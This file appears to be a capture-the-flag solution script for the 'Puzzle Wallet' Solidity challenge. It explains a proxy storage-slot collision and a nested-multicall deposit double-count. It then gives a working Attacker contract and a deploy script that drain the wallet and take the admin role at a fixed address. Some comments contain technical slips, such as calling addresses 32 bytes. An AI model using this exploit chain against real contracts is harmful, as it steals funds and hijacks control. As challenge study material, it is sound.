// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

/**
 * Solution
 * =====================================================================================
 * Prerequisites:
 * First we must understand what Upgradable Proxies are and how they work.
 * The crucial part is to know how storage slots work in UUPS.
 * 
 * =====================================================================================
 * Part 1
 * UUPS operate through delegatecalls. We already know how the delegatecall works. 
 * We have two contracts - "proxy" and "implementation" contracts. The transaction executes the "implementation" 
 * contract's logic but it changes the state of the "proxy" contract.
 * 
 * Imagine it this way our concrete scenario:
 * PuzzleProxy -> delegetecall -> PuzzleWallet. The logic from PuzzleWallet will be executed but the storage will be
 * updared in Puzzle Proxy.
 * 
 * =====================================================================================
 * Part 2
 * How can we become an admin of PuzzleProxy. As you can see there are two variables "pendingAdmin" and "admin".
 * In PuzzleWallet we have "owner" and "maxBalance". 
 * "maxBalance" is corresponding to the "admin" variable, which means if we can change "maxBalance" through the PuzzleProxy
 * we can change the admin.
 * 
 * =====================================================================================
 * Part 3
 * We see that setMaxBalance has a modifier onlyWhitelisted which requires us to be an onwer of the contract. 
 * How to become an owner of the contract? Simply execute PuzzleProxy.proposeNewAdmin() passing our address.
 * Fist storage slot from PuzzleProxy is corresponding to the first storage slot from PuzzleWallet
 * 
 * =====================================================================================
 * Part 4
 * Now we need to add our address to the whitelist.
 * Simply by executing PuzzleProxy.addToWhitelist(). 
 * 
 * =====================================================================================
 * Part 5
 * How to execute setMaxBalance? 
 * There's a requirement: address(this).balance == 0
 * How can we withdraw the 0.001 ETH from PuzzleProxy?
 * Let's take a look at few different cases
 * 1. execute() to withdraw 0.001 ETH
 * 1.1. This is not going to be possible because to call execute there's require balances[msg.sender] >= value
 * because our current balance is 0, the may be we should deposit?
 * 1.2. deposit() - we can deposit 0.001 ETH in order to bypass the validation in execute() but then again
 * we won't be able to execute setMaxBalance() since the requirement there is for the address to have 0 ETH.
 * We need another approach
 * 
 * =====================================================================================
 * Part 6
 * multicall 
 * In order to be able to withdraw all of the funds in the contract first we must deposit 0.001 ETH, but we also 
 * need to update balances[msg.sender] twice. Why twice? Because currently the Proxy's balance is 0.001 ETH, when we 
 * deposit 0.001 ETH the balance will become 0.002 ETH but since we've called deposit() only once, this means 
 * balances[msg.sender] will be equal to 0.001 ETH and we won't be able to execute execute() method.
 * 
 * The key move of this challange is to execute the multicall() method which will execute first deposit and after that
 * multicall that executes deposit
 * 
 * multicall
 * 1. deposit
 * 2. multicall
 *      deposit
 * 
 * msg.value is available to the entire multicall function call, including the internal calls made by it, like deposit(),
 * that's WHY we deposit only 0.001 ETH instead of 0.002 ETH.
 * 
 * =====================================================================================
 * Part 7
 * Lastly we have to call puzzleProxy.execute() in order to withdraw all the funds.
 * And since addresses in Solidity are 32 bytes and the corresponding maxBalance is uint256 we just need to cast
 * the address of new admin to uint256. This can happen easily like this:
 * uint256(uint160(address(new_admin))) -> 32 bytes (20 bytes (address))
 */

interface IPuzzleProxy {
    function pendingAdmin() external view returns (address);
    function admin() external view returns (address);
    
    function owner() external view returns (address);
    function maxBalance() external view returns (uint256);
    function whitelisted(address addr) external view returns (bool);
    function balances(address addr) external view returns (uint256);
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;


    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function upgradeTo(address _newImplementation) external;
    function addToWhitelist(address addr) external;

}

interface IPuzzleWallet {
    function owner() external view returns (address);
    function maxBalance() external view returns (uint256);
    function whitelisted(address addr) external view returns (bool);
    function balances(address addr) external view returns (uint256);

    function init(uint256 _maxBalance) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
}

contract Attacker {

    IPuzzleProxy puzzleProxy;

    constructor(address _target) payable {
        puzzleProxy = IPuzzleProxy(_target);
        puzzleProxy.proposeNewAdmin(address(this));
        puzzleProxy.addToWhitelist(address(this));

        bytes[] memory deposit_arr = new bytes[](1);
        deposit_arr[0] = abi.encodeWithSelector(puzzleProxy.deposit.selector);

        bytes memory multicall = abi.encodeWithSelector(puzzleProxy.multicall.selector, deposit_arr);

        bytes[] memory multicalldata = new bytes[](2);
        multicalldata[0] = deposit_arr[0];
        multicalldata[1] = multicall;
        puzzleProxy.multicall{value: 0.001 ether}(multicalldata);
        puzzleProxy.execute(msg.sender, 0.002 ether, "");
        puzzleProxy.setMaxBalance(uint256(uint160(msg.sender)));
    }
}

contract PuzzleWalletScript is Script {


    function run() public {    
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IPuzzleProxy puzzleProxy = IPuzzleProxy(0x0E138cDea2B50830b72eba736398DD521c51A6BF);
        console.log("Old Admin", puzzleProxy.admin());

        new Attacker{value: 0.001 ether}(0x0E138cDea2B50830b72eba736398DD521c51A6BF);

        console.log("New Admin", puzzleProxy.admin());
        vm.stopBroadcast();
    }
}
